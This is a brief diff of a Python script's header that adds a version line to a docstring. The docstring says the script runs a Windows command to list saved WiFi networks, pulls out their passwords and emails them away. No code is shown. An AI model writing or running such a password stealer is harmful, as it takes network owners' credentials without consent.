@@ -1,5 +1,9 @@
 #!/usr/bin/env python
+
+
 """
+Ver: Python3
+
 it executes Windows command to get list of all WiFi networks, encapsulates password from it and send it via email 
 """
 
